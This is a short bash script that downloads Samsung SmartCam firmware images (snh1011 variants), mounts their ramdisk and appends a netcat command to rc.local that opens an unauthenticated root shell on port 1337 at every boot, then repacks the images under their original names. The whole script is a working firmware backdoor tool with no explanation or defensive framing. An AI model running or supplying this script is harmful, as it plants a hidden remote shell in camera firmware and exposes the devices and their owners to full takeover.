#!/usr/bin/env bash

# run this as root
# it assumes the firmware you download is version 4.12

umask 022

function patch {
	wget http://www.samsungsmartcam.com/firmware/$1

	mkdir working_dir
	cd working_dir

	tar -zxpf ../$1
	gzip -d ramdisk_snb5000.dm365.gz

	mkdir root_dir
	mount ramdisk_snb5000.dm365 root_dir

	echo 'nc -ll -p 1337 -e /bin/sh &' >> root_dir/etc/rc.d/rc.local

	umount root_dir
	rmdir root_dir

	gzip ramdisk_snb5000.dm365
	tar -czf ../$1 *

	cd ..
	rm -rf working_dir

	chown 1000:1000 $1
}

cd firmware
rm snh1011*.tgz

patch snh1011.tgz
patch snh1011nv.tgz
